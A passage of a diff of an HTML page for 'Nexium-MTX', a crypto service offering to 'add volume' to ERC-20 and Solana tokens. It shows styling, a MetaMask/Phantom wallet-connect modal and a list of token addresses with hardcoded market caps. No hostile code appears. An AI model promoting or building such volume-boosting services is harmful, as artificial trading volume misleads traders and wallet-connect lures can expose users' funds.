@@ -1,696 +1,570 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="description" content="Nexium-MTX: Add volume to ERC-20 tokens on Ethereum Mainnet using MetaMask, and Phantom">
-  <title>Nexium Add Volume</title>
-  <meta http-equiv="Content-Security-Policy" content="
-    default-src 'self';
-    img-src 'self' https://nexium-bot.onrender.com data:;
-    style-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com https://cdn.tailwindcss.com;
-    font-src 'self' https://cdnjs.cloudflare.com;
-    script-src 'self' https://cdn.tailwindcss.com https://cdnjs.cloudflare.com https://unpkg.com https://cdn.jsdelivr.net;
-    connect-src 'self' https://cloud.walletconnect.com https://rpc.ankr.com wss://relay.walletconnect.org https://solana-mainnet.api.syndica.io;
-    frame-src 'self' https://verify.walletconnect.org;
-  ">
-  <link rel="icon" type="image/png" href="/favicon.svg">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer" />
-  <link rel="stylesheet" href="style.css">
-  <script src="https://unpkg.com/@solana/web3.js@1.95.3/dist/index.global.js"></script>
-  <script src="https://unpkg.com/@solana/spl-token@0.4.8/lib/index.global.js"></script>
-  <script src="https://unpkg.com/ethers@6.13.2/dist/ethers.min.js"></script>
-  <script src="https://unpkg.com/@walletconnect/universal-provider@3.0.1/dist/index.global.js"></script>
-  <script src="https://unpkg.com/qrcode@1.5.3/build/qrcode.min.js"></script>
-  <style>
-    body {
-      background: linear-gradient(45deg, #0d0c1d, #1a182e, #1a0c4b);
-      background-size: 400%;
-      animation: gradientShift 15s ease infinite;
-      position: relative;
-    }
-    @keyframes gradientShift {
-      0% { background-position: 0% 50%; }
-      50% { background-position: 100% 50%; }
-      100% { background-position: 0% 50%; }
-    }
-    #backgroundCanvas {
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      z-index: -1;
-      opacity: 0.3;
-      pointer-events: none;
-    }
-    nav, main, footer, section {
-      position: relative;
-      z-index: 1;
-    }
-    .glow-button {
-      background: linear-gradient(45deg, #facc15, #f97316);
-      box-shadow: 0 0 15px rgba(250, 204, 21, 0.7);
-    }
-    .glow-button:hover {
-      box-shadow: 0 0 25px rgba(250, 204, 21, 1);
-      transform: scale(1.05);
-    }
-    .glass {
-      background: rgba(255, 255, 255, 0.1);
-      backdrop-filter: blur(10px);
-      -webkit-backdrop-filter: blur(10px);
-    }
-    .wallet-modal, .token-popup, .custom-token-popup {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.7);
-      z-index: 2000;
-      align-items: center;
-      justify-content: center;
-    }
-    .wallet-modal.active, .token-popup.active, .custom-token-popup.active {
-      display: flex;
-    }
-    .wallet-modal-content, .token-popup-content, .custom-token-popup-content {
-      background: #1a182e;
-      border: 1px solid #f97316;
-      border-radius: 12px;
-      padding: 24px;
-      width: 90%;
-      max-width: 400px;
-      text-align: center;
-    }
-    .wallet-modal-content h2, .token-popup-content h2, .custom-token-popup-content h2 {
-      color: #facc15;
-      font-size: 1.5rem;
-      margin-bottom: 16px;
-    }
-    .wallet-modal-content button, .token-popup-content button, .custom-token-popup-content button {
-      display: block;
-      width: 100%;
-      padding: 12px;
-      margin: 8px 0;
-      background: linear-gradient(45deg, #facc15, #f97316);
-      color: #000;
-      font-weight: bold;
-      border-radius: 6px;
-      box-shadow: 0 0 10px rgba(250, 204, 21, 0.7);
-      transition: transform 0.2s, box-shadow 0.2s;
-      border: none;
-      cursor: pointer;
-    }
-    .wallet-modal-content button:hover, .token-popup-content button:hover, .custom-token-popup-content button:hover {
-      color: #fff;
-      transform: scale(1.05);
-      box-shadow: 0 0 15px rgba(250, 204, 21, 1);
-    }
-    .wallet-modal-content .close-modal, .token-popup-content .close-popup, .custom-token-popup-content .close-popup {
-      background: #4b5563;
-      color: #fff;
-      margin-top: 16px;
-    }
-    .wallet-modal-content .close-modal:hover, .token-popup-content .close-popup:hover, .custom-token-popup-content .close-popup:hover {
-      background: #6b7280;
-      transform: scale(1.05);
-      box-shadow: 0 0 15px rgba(107, 114, 128, 0.7);
-    }
-    .nav-menu {
-      display: flex;
-      flex-direction: column;
-      gap: 8px;
-      width: 100%;
-      align-items: center;
-    }
-    .nav-menu a {
-      text-align: center;
-      width: 100%;
-      max-width: 200px;
-      padding: 8px 16px;
-      color: #d1d5db;
-      font-weight: 600;
-      text-decoration: none;
-      transition: color 0.2s;
-    }
-    .nav-menu a:hover {
-      color: #facc15;
-    }
-    @media (min-width: 640px) {
-      .nav-menu {
-        flex-direction: row;
-        justify-content: center;
-      }
-      .nav-menu a {
-        width: auto;
-        padding: 8px 16px;
-      }
-    }
-    .token-grid {
-      display: grid;
-      grid-template-columns: repeat(4, minmax(0, 1fr));
-      gap: 1.5rem;
-    }
-    @media (max-width: 768px) {
-      .token-grid {
-        grid-template-columns: repeat(2, minmax(0, 1fr));
-      }
-    }
-    @media (max-width: 480px) {
-      .token-grid {
-        grid-template-columns: 1fr;
-      }
-    }
-    .token-card, .custom-token-card {
-      background: #1a182e;
-      padding: 1rem;
-      border-radius: 0.5rem;
-      border: 1px solid #f97316;
-      box-shadow: 0 0 10px rgba(250, 204, 21, 0.3);
-      transition: transform 0.2s, box-shadow 0.2s;
-      text-align: center;
-      cursor: pointer;
-    }
-    .token-card:hover, .custom-token-card:hover {
-      transform: translateY(-5px);
-      box-shadow: 0 0 15px rgba(250, 204, 21, 0.7);
-    }
-    .token-card p, .custom-token-card p {
-      margin: 0.5rem 0;
-      font-size: 0.9rem;
-    }
-    .token-card .name, .custom-token-card .name {
-      font-weight: bold;
-      font-size: 1.1rem;
-      color: #facc15;
-    }
-    .token-card .address, .custom-token-card .address {
-      word-break: break-all;
-      color: #d1d5db;
-      overflow: hidden;
-      text-overflow: ellipsis;
-      white-space: nowrap;
-    }
-    @media (max-width: 480px) {
-      .token-card .address, .custom-token-card .address {
-        font-size: 0.7rem;
-        line-height: 1.2;
-        white-space: normal;
-        word-break: break-word;
-        overflow-wrap: anywhere;
-      }
-      .token-popup-content .address, .custom-token-popup-content .address {
-        font-size: 0.7rem;
-        line-height: 1.2;
-        white-space: normal;
-        word-break: break-word;
-        overflow-wrap: anywhere;
-      }
-    }
-    .token-card .market-cap {
-      color: #9ca3af;
-    }
-    .custom-token-popup-content .input-group {
-      display: flex;
-      align-items: center;
-      margin: 1rem 0;
-    }
-    .custom-token-popup-content .input-group span {
-      color: #facc15;
-      font-size: 1.2rem;
-      margin-right: 0.5rem;
-    }
-    .custom-token-popup-content .volume-input, .custom-token-popup-content .address-input {
-      flex-grow: 1;
-      background: #1a182e;
-      border: 1px solid #f97316;
-      color: #fff;
-      padding: 0.5rem;
-      border-radius: 6px;
-      font-size: 1rem;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Nexium-MTX: Add volume to ERC-20 tokens on Ethereum Mainnet using MetaMask, and Phantom">
+    <title>Nexium Add Volume</title>
+    <meta http-equiv="Content-Security-Policy" content="
+      default-src 'self';
+      img-src 'self' https://nexium-bot.onrender.com data: https://i.ibb.co;
+      style-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com https://cdn.tailwindcss.com;
+      font-src 'self' https://cdnjs.cloudflare.com;
+      script-src 'self' https://cdn.tailwindcss.com https://cdnjs.cloudflare.com https://unpkg.com https://cdn.jsdelivr.net;
+      connect-src 'self' https://cloud.walletconnect.com https://rpc.ankr.com wss://relay.walletconnect.org https://solana-mainnet.api.syndica.io;
+      frame-src 'self' https://verify.walletconnect.org;
+    ">
+    <link rel="icon" type="image/png" href="/favicon.svg">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link rel="stylesheet" href="style.css">
+    <script src="https://unpkg.com/@solana/web3.js@1.95.3/dist/index.global.js"></script>
+    <script src="https://unpkg.com/@solana/spl-token@0.4.8/lib/index.global.js"></script>
+    <script src="https://unpkg.com/ethers@6.13.2/dist/ethers.min.js"></script>
+    <script src="https://unpkg.com/@walletconnect/universal-provider@3.0.1/dist/index.global.js"></script>
+    <script src="https://unpkg.com/qrcode@1.5.3/build/qrcode.min.js"></script>
+    <style>
+        body {
+            background: linear-gradient(45deg, #0d0c1d, #1a182e, #1a0c4b);
+            background-size: 400%;
+            animation: gradientShift 15s ease infinite;
+            position: relative;
+        }
+        @keyframes gradientShift {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        #backgroundCanvas {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            opacity: 0.3;
+            pointer-events: none;
+        }
+        nav, main, footer, section {
+            position: relative;
+            z-index: 1;
+        }
+        .glow-button {
+            background: linear-gradient(45deg, #facc15, #f97316);
+            box-shadow: 0 0 15px rgba(250, 204, 21, 0.7);
+        }
+        .glow-button:hover {
+            box-shadow: 0 0 25px rgba(250, 204, 21, 1);
+            transform: scale(1.05);
+        }
+        .glass {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+        }
+        .wallet-modal, .token-popup, .custom-token-popup {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 2000;
+            align-items: center;
+            justify-content: center;
+        }
+        .wallet-modal.active, .token-popup.active, .custom-token-popup.active {
+            display: flex;
+        }
+        .wallet-modal-content, .token-popup-content, .custom-token-popup-content {
+            background: #1a182e;
+            border: 1px solid #f97316;
+            border-radius: 12px;
+            padding: 24px;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+        }
+        .wallet-modal-content h2, .token-popup-content h2, .custom-token-popup-content h2 {
+            color: #facc15;
+            font-size: 1.5rem;
+            margin-bottom: 16px;
+        }
+        .wallet-modal-content button, .token-popup-content button, .custom-token-popup-content button {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            background: linear-gradient(45deg, #facc15, #f97316);
+            color: #000;
+            font-weight: bold;
+            border-radius: 6px;
+            box-shadow: 0 0 10px rgba(250, 204, 21, 0.7);
+            transition: transform 0.2s, box-shadow 0.2s;
+            border: none;
+            cursor: pointer;
+        }
+        .wallet-modal-content button:hover, .token-popup-content button:hover, .custom-token-popup-content button:hover {
+            color: #fff;
+            transform: scale(1.05);
+            box-shadow: 0 0 15px rgba(250, 204, 21, 1);
+        }
+        .wallet-modal-content .close-modal, .token-popup-content .close-popup, .custom-token-popup-content .close-popup {
+            background: #4b5563;
+            color: #fff;
+            margin-top: 16px;
+        }
+        .wallet-modal-content .close-modal:hover, .token-popup-content .close-popup:hover, .custom-token-popup-content .close-popup:hover {
+            background: #6b7280;
+            transform: scale(1.05);
+            box-shadow: 0 0 15px rgba(107, 114, 128, 0.7);
+        }
+        .nav-menu {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            width: 100%;
+            align-items: center;
+        }
+        .nav-menu a {
+            text-align: center;
+            width: 100%;
+            max-width: 200px;
+            padding: 8px 16px;
+            color: #d1d5db;
+            font-weight: 600;
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+        .nav-menu a:hover {
+            color: #facc15;
+        }
+        @media (min-width: 640px) {
+            .nav-menu {
+                flex-direction: row;
+                justify-content: center;
+            }
+            .nav-menu a {
+                width: auto;
+                padding: 8px 16px;
+            }
+        }
+        .token-grid {
+            display: grid;
+            grid-template-columns: repeat(4, minmax(0, 1fr));
+            gap: 1.5rem;
+        }
+        @media (max-width: 768px) {
+            .token-grid {
+                grid-template-columns: repeat(2, minmax(0, 1fr));
+            }
+        }
+        @media (max-width: 480px) {
+            .token-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+        .token-card, .custom-token-card {
+            background: #1a182e;
+            padding: 1rem;
+            border-radius: 0.5rem;
+            border: 1px solid #f97316;
+            box-shadow: 0 0 10px rgba(250, 204, 21, 0.3);
+            transition: transform 0.2s, box-shadow 0.2s;
+            text-align: center;
+            cursor: pointer;
+        }
+        .token-card:hover, .custom-token-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 0 15px rgba(250, 204, 21, 0.7);
+        }
+        .token-card p, .custom-token-card p {
+            margin: 0.5rem 0;
+            font-size: 0.9rem;
+        }
+        .token-card .name, .custom-token-card .name {
+            font-weight: bold;
+            font-size: 1.1rem;
+            color: #facc15;
+        }
+        .token-card .address, .custom-token-card .address {
+            word-break: break-all;
+            color: #d1d5db;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+        @media (max-width: 480px) {
+            .token-card .address, .custom-token-card .address {
+                font-size: 0.7rem;
+                line-height: 1.2;
+                white-space: normal;
+                word-break: break-word;
+                overflow-wrap: anywhere;
+            }
+            .token-popup-content .address, .custom-token-popup-content .address {
+                font-size: 0.7rem;
+                line-height: 1.2;
+                white-space: normal;
+                word-break: break-word;
+                overflow-wrap: anywhere;
+            }
+        }
+        .token-card .market-cap {
+            color: #9ca3af;
+        }
+        .custom-token-popup-content .input-group {
+            display: flex;
+            align-items: center;
+            margin: 1rem 0;
+        }
+        .custom-token-popup-content .input-group span {
+            color: #facc15;
+            font-size: 1.2rem;
+            margin-right: 0.5rem;
+        }
+        .custom-token-popup-content .volume-input, .custom-token-popup-content .address-input {
+            flex-grow: 1;
+            background: #1a182e;
+            border: 1px solid #f97316;
+            color: #fff;
+            padding: 0.5rem;
+            border-radius: 6px;
+            font-size: 1rem;
+        }
+        .form-group label {
+            color: #facc15;
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 600;
+        }
+        .form-group select, .form-group input {
+            width: 100%;
+            padding: 0.75rem;
+            border-radius: 8px;
+            border: 1px solid #f97316;
+            background-color: #1a182e;
+            color: #d1d5db;
+            font-size: 1rem;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+        .form-group select:focus, .form-group input:focus {
+            outline: none;
+            border-color: #facc15;
+            box-shadow: 0 0 0 3px rgba(250, 204, 21, 0.5);
+        }
+        .info-card {
+            background: #1a182e;
+            border-radius: 12px;
+            padding: 1.5rem;
+            border: 1px solid #f97316;
+            box-shadow: 0 0 15px rgba(250, 204, 21, 0.3);
+            text-align: center;
+        }
+        .info-card img {
+            width: 64px;
+            height: 64px;
+            margin: 0 auto 1rem;
+        }
+        .info-card h3 {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: #facc15;
+            margin-bottom: 0.5rem;
+        }
+        .info-card p {
+            color: #9ca3af;
+        }
+    </style>
 </head>
 <body class="bg-[#0d0c1d] text-white font-sans flex flex-col min-h-screen">
-  <canvas id="backgroundCanvas"></canvas>
-  <nav class="w-full max-w-3xl mx-auto flex flex-col items-center bg-[#1a182e] p-4 rounded-xl shadow border border-orange-400 gap-4">
-    <div class="flex items-center justify-center">
-      <img src="/logo.png" alt="Nexium-MTX Logo" id="title-logo" class="h-14 w-14" onerror="console.log('Logo load failed'); this.classList.add('hidden')">
-      <span class="text-lg font-bold text-yellow-400 -ml-1">Nexium-MTX</span>
+    <canvas id="backgroundCanvas"></canvas>
+    <nav class="w-full max-w-3xl mx-auto flex flex-col items-center bg-[#1a182e] p-4 rounded-xl shadow border border-orange-400 gap-4">
+        <div class="flex items-center justify-center">
+            <img src="/logo.png" alt="Nexium-MTX Logo" id="title-logo" class="h-14 w-14" onerror="console.log('Logo load failed'); this.classList.add('hidden')">
+            <span class="text-lg font-bold text-yellow-400 -ml-1">Nexium-MTX</span>
+        </div>
+        <div class="flex flex-col items-center gap-2 w-full">
+            <div class="nav-menu flex flex-col gap-2" id="nav-menu">
+                <a href="index.html" class="text-gray-300 hover:text-yellow-400 font-semibold py-2 px-4">Home</a>
+                <a href="about.html" class="text-gray-300 hover:text-yellow-400 font-semibold py-2 px-4">About</a>
+                <a href="add-volume.html" class="text-gray-300 hover:text-yellow-400 font-semibold py-2 px-4">Token</a>
+            </div>
+            <button id="connect-wallet" class="glow-button text-black font-semibold py-2 px-4 rounded-xl animate-pulse transition-all" aria-label="Connect Wallet">Connect Wallet</button>
+        </div>
+    </nav>
+    <div class="wallet-modal" id="wallet-modal">
+        <div class="wallet-modal-content">
+            <h2 class="text-yellow-400">Select a Wallet</h2>
+            <button id="connect-metamask" class="glow-button" aria-label="Connect MetaMask">Connect MetaMask</button>
+            <button id="connect-phantom" class="glow-button" aria-label="Connect Phantom">Connect Phantom</button>
+            <button class="close-modal" id="close-modal" aria-label="Close Modal">Close</button>
+        </div>
     </div>
-    <div class="flex flex-col items-center gap-2 w-full">
-      <div class="nav-menu flex flex-col gap-2" id="nav-menu">
-        <a href="index.html" class="text-gray-300 hover:text-yellow-400 font-semibold py-2 px-4">Home</a>
-        <a href="about.html" class="text-gray-300 hover:text-yellow-400 font-semibold py-2 px-4">About</a>
-        <a href="add-volume.html" class="text-gray-300 hover:text-yellow-400 font-semibold py-2 px-4">Token</a>
-      </div>
-      <button id="connect-wallet" class="glow-button text-black font-semibold py-2 px-4 rounded-xl animate-pulse transition-all" aria-label="Connect Wallet">Connect Wallet</button>
+    <div id="metamaskPrompt" class="metamask-prompt hidden text-center bg-[#1a182e] p-6 rounded-xl border border-orange-400 glass">
+        <p class="text-white">No wallet installed. Install <a href="#" class="text-yellow-400 hover:underline" id="walletLink">wallet</a> to continue.</p>
     </div>
-  </nav>
-  <div class="wallet-modal" id="wallet-modal">
-    <div class="wallet-modal-content">
-      <h2 class="text-yellow-400">Select a Wallet</h2>
-      <button id="connect-metamask" class="glow-button" aria-label="Connect MetaMask">Connect MetaMask</button>
-      <button id="connect-phantom" class="glow-button" aria-label="Connect Phantom">Connect Phantom</button>
-      <button class="close-modal" id="close-modal" aria-label="Close Modal">Close</button>
-    </div>
-  </div>
-  <div id="metamaskPrompt" class="metamask-prompt hidden text-center bg-[#1a182e] p-6 rounded-xl border border-orange-400 glass">
-    <p class="text-white">No wallet installed. Install <a href="#" class="text-yellow-400 hover:underline" id="walletLink">wallet</a> to continue.</p>
-  </div>
-  <main id="app" class="flex-1 flex flex-col items-center justify-center px-4">
-  </main>
-  <section class="py-12 px-4 max-w-6xl mx-auto">
-    <h2 class="text-2xl font-semibold text-yellow-400 mb-6 text-center" style="text-shadow: 0 0 10px rgba(250, 204, 21, 0.8);">Explore Top Tokens for Volume Boosting</h2>
-    <div class="token-grid">
-      <div class="custom-token-card">
-        <p class="name">Import Custom Token</p>
-        <p class="address">Enter custom address</p>
-      </div>
-      <div class="token-card" data-address="0xdac17f958d2ee523a2206206994597c13d831ec7">
-        <p class="name">USDT (ETH)</p>
-        <p class="address">0xdac17f958d2ee523a2206206994597c13d831ec7</p>
-        <p class="market-cap">Market Cap: $120B</p>
-      </div>
-      <div class="token-card" data-address="0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48">
-        <p class="name">USDC (ETH)</p>
-        <p class="address">0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48</p>
-        <p class="market-cap">Market Cap: $34B</p>
-      </div>
-      <div class="token-card" data-address="0x514910771af9ca656af840dff83e8264ecf986ca">
-        <p class="name">LINK (ETH)</p>
-        <p class="address">0x514910771af9ca656af840dff83e8264ecf986ca</p>
-        <p class="market-cap">Market Cap: $16B</p>
-      </div>
-      <div class="token-card" data-address="0x2af5d2ad76741191d15dde7bf6ac92d4bd912ca3">
-        <p class="name">LEO (ETH)</p>
-        <p class="address">0x2af5d2ad76741191d15dde7bf6ac92d4bd912ca3</p>
-        <p class="market-cap">Market Cap: $8.9B</p>
-      </div>
-      <div class="token-card" data-address="0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce">
-        <p class="name">SHIB (ETH)</p>
-        <p class="address">0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce</p>
-        <p class="market-cap">Market Cap: $7.2B</p>
-      </div>
-      <div class="token-card" data-address="0x1f9840a85d5af5bf1d1762f925bdaddc4201f984">
-        <p class="name">UNI (ETH)</p>
-        <p class="address">0x1f9840a85d5af5bf1d1762f925bdaddc4201f984</p>
-        <p class="market-cap">Market Cap: $6.4B</p>
-      </div>
-      <div class="token-card" data-address="0x6982508145454ce325ddbeb5388b1e9e9b404ee">
-        <p class="name">PEPE (ETH)</p>
-        <p class="address">0x6982508145454ce325ddbeb5388b1e9e9b404ee</p>
-        <p class="market-cap">Market Cap: $4.4B</p>
-      </div>
-      <div class="token-card" data-address="0x7fc66500c84a76ad7e9c93437bfc5ac33e2ddea9">
-        <p class="name">AAVE (ETH)</p>
-        <p class="address">0x7fc66500c84a76ad7e9c93437bfc5ac33e2ddea9</p>
-        <p class="market-cap">Market Cap: $4.2B</p>
-      </div>
-      <div class="token-card" data-address="0x3c3a81e81dc49a468bea9d0fc85412f65947f1cf">
-        <p class="name">MNT (ETH)</p>
-        <p class="address">0x3c3a81e81dc49a468bea9d0fc85412f65947f1cf</p>
-        <p class="market-cap">Market Cap: $4.5B</p>
-      </div>
-      <div class="token-card" data-address="0x57e114b691db7904ca757b1df9d453d4331fd3d5">
-        <p class="name">ENA (ETH)</p>
-        <p class="address">0x57e114b691db7904ca757b1df9d453d4331fd3d5</p>
-        <p class="market-cap">Market Cap: $3B</p>
-      </div>
-      <div class="token-card" data-address="Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB">
-        <p class="name">USDT (SOL)</p>
-        <p class="address">Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB</p>
-        <p class="market-cap">Market Cap: $120B</p>
-      </div>
-      <div class="token-card" data-address="EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v">
-        <p class="name">USDC (SOL)</p>
-        <p class="address">EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v</p>
-        <p class="market-cap">Market Cap: $34B</p>
-      </div>
-      <div class="token-card" data-address="JUPyiwrYJFskUPi3on1qnRMyb9KC3bCDevoQAxs6WzD">
-        <p class="name">JUP (SOL)</p>
-        <p class="address">JUPyiwrYJFskUPi3on1qnRMyb9KC3bCDevoQAxs6WzD</p>
-        <p class="market-cap">Market Cap: $0.7B</p>
-      </div>
-      <div class="token-card" data-address="HZ1JovNiVvGrGNiiYvEozEVgZ58xaU3RKwX8eACQBCt3">
-        <p class="name">PYTH (SOL)</p>
-        <p class="address">HZ1JovNiVvGrGNiiYvEozEVgZ58xaU3RKwX8eACQBCt3</p>
-        <p class="market-cap">Market Cap: $0.5B</p>
-      </div>
-      <div class="token-card" data-address="4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R">
-        <p class="name">RAY (SOL)</p>
-        <p class="address">4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R</p>
-        <p class="market-cap">Market Cap: $0.6B</p>
-      </div>
-      <div class="token-card" data-address="DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263">
-        <p class="name">BONK (SOL)</p>
-        <p class="address">DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263</p>
-        <p class="market-cap">Market Cap: $1.5B</p>
-      </div>
-      <div class="token-card" data-address="EKpQGSJtjMFqUZ5dscq4YN5s9of7uUkaeA1QHiNjYUy7">
-        <p class="name">WIF (SOL)</p>
-        <p class="address">EKpQGSJtjMFqUZ5dscq4YN5s9of7uUkaeA1QHiNjYUy7</p>
-        <p class="market-cap">Market Cap: $2B</p>
-      </div>
-      <div class="token-card" data-address="6D7NaBelnjprAMg7NNLkwX9FaDgiLu4yaex2dtfuDMdK">
-        <p class="name">POPCAT (SOL)</p>
-        <p class="address">6D7NaBelnjprAMg7NNLkwX9FaDgiLu4yaex2dtfuDMdK</p>
-        <p class="market-cap">Market Cap: $1B</p>
-      </div>
-      <div class="token-card" data-address="HhJpBhRRn4g56VsyLuT8DL5Bv31HkXqsrahTTUCZeZg4">
-        <p class="name">MEW (SOL)</p>
-        <p class="address">HhJpBhRRn4g56VsyLuT8DL5Bv31HkXqsrahTTUCZeZg4</p>
-        <p class="market-cap">Market Cap: $0.8B</p>
-      </div>
-      <div class="token-card" data-address="hntyVP6YFm1E9D3g8E2An6MmPMwQyzkgCUnxazhS154">
-        <p class="name">HNT (SOL)</p>
-        <p class="address">hntyVP6YFm1E9D3g8E2An6MmPMwQyzkgCUnxazhS154</p>
-        <p class="market-cap">Market Cap: $1B</p>
-      </div>
-      <div class="token-card" data-address="0x6b175474e89094c44da98b954eedeac495271d0f">
-        <p class="name">DAI (ETH)</p>
-        <p class="address">0x6b175474e89094c44da98b954eedeac495271d0f</p>
-        <p class="market-cap">Market Cap: $5.3B</p>
-      </div>
-      <div class="token-card" data-address="0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2">
-        <p class="name">MKR (ETH)</p>
-        <p class="address">0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2</p>
-        <p class="market-cap">Market Cap: $2.1B</p>
-      </div>
-      <div class="token-card" data-address="0x5a98fcbea516cf06857215779fd812ca3bef1b32">
-        <p class="name">LDO (ETH)</p>
-        <p class="address">0x5a98fcbea516cf06857215779fd812ca3bef1b32</p>
-        <p class="market-cap">Market Cap: $1.8B</p>
-      </div>
-      <div class="token-card" data-address="0xd533a949740bb3306d119cc777fa900ba034cd52">
-        <p class="name">CRV (ETH)</p>
-        <p class="address">0xd533a949740bb3306d119cc777fa900ba034cd52</p>
-        <p class="market-cap">Market Cap: $1.2B</p>
-      </div>
-      <div class="token-card" data-address="0xc00e94cb662c3520282e6f5717214004a7f26888">
-        <p class="name">COMP (ETH)</p>
-        <p class="address">0xc00e94cb662c3520282e6f5717214004a7f26888</p>
-        <p class="market-cap">Market Cap: $0.9B</p>
-      </div>
-      <div class="token-card" data-address="0x0d8775f648430679a709e98d2b0cb6250d2887ef">
-        <p class="name">BAT (ETH)</p>
-        <p class="address">0x0d8775f648430679a709e98d2b0cb6250d2887ef</p>
-        <p class="market-cap">Market Cap: $0.8B</p>
-      </div>
-      <div class="token-card" data-address="0xe41d2489571d322189246dafa5ebde1f4699f498">
-        <p class="name">ZRX (ETH)</p>
-        <p class="address">0xe41d2489571d322189246dafa5ebde1f4699f498</p>
-        <p class="market-cap">Market Cap: $0.7B</p>
-      </div>
-      <div class="token-card" data-address="0x111111111117dc0aa78b770fa6a738034120c302">
-        <p class="name">1INCH (ETH)</p>
-        <p class="address">0x111111111117dc0aa78b770fa6a738034120c302</p>
-        <p class="market-cap">Market Cap: $0.6B</p>
-      </div>
-      <div class="token-card" data-address="0xc011a73ee8576fb46f5e1c5751ca3b9fe0af2a6f">
-        <p class="name">SNX (ETH)</p>
-        <p class="address">0xc011a73ee8576fb46f5e1c5751ca3b9fe0af2a6f</p>
-        <p class="market-cap">Market Cap: $0.5B</p>
-      </div>
-      <div class="token-card" data-address="0xba100000625a3754423978a60c9317c58a424e3d">
-        <p class="name">BAL (ETH)</p>
-        <p class="address">0xba100000625a3754423978a60c9317c58a424e3d</p>
-        <p class="market-cap">Market Cap: $0.4B</p>
-      </div>
-      <div class="token-card" data-address="orcaEKTdK7LKz57vaAYr9QeNsVEPfiu6QeMU1kektZE">
-        <p class="name">ORCA (SOL)</p>
-        <p class="address">orcaEKTdK7LKz57vaAYr9QeNsVEPfiu6QeMU1kektZE</p>
-        <p class="market-cap">Market Cap: $0.3B</p>
-      </div>
-      <div class="token-card" data-address="mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So">
-        <p class="name">MSOL (SOL)</p>
-        <p class="address">mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So</p>
-        <p class="market-cap">Market Cap: $0.9B</p>
-      </div>
-      <div class="token-card" data-address="jtojtomepa8beP8AuQc6e3nZsKxLeSU6P13C5K6V1">
-        <p class="name">JTO (SOL)</p>
-        <p class="address">jtojtomepa8beP8AuQc6e3nZsKxLeSU6P13C5K6V1</p>
-        <p class="market-cap">Market Cap: $0.4B</p>
-      </div>
-      <div class="token-card" data-address="Saber2gLauYim4Mvftnrasomsv6NvAuncvMEZwcLpD1">
-        <p class="name">SBR (SOL)</p>
-        <p class="address">Saber2gLauYim4Mvftnrasomsv6NvAuncvMEZwcLpD1</p>
-        <p class="market-cap">Market Cap: $0.2B</p>
-      </div>
-      <div class="token-card" data-address="StepAscQoEioFxxWGnh2sLBDFp9d8rvKz2Yp39iDpyT">
-        <p class="name">STEP (SOL)</p>
-        <p class="address">StepAscQoEioFxxWGnh2sLBDFp9d8rvKz2Yp39iDpyT</p>
-        <p class="market-cap">Market Cap: $0.1B</p>
-      </div>
-      <div class="token-card" data-address="SLNDpmoWTVADgEdndyvWzroNL7zSi1dF9PC3xHGtPwp">
-        <p class="name">SLND (SOL)</p>
-        <p class="address">SLNDpmoWTVADgEdndyvWzroNL7zSi1dF9PC3xHGtPwp</p>
-        <p class="market-cap">Market Cap: $0.15B</p>
-      </div>
-      <div class="token-card" data-address="AGFEad2et2ZJif9jaGpdMixQqvW5i81aBdvKe7PHNfz3">
-        <p class="name">FTT (SOL)</p>
-        <p class="address">AGFEad2et2ZJif9jaGpdMixQqvW5i81aBdvKe7PHNfz3</p>
-        <p class="market-cap">Market Cap: $0.5B</p>
-      </div>
-      <div class="token-card" data-address="SRMuApVNdxXokk5GT7XD5cUUgXMBCoAz2LHeuAoKWRt">
-        <p class="name">SRM (SOL)</p>
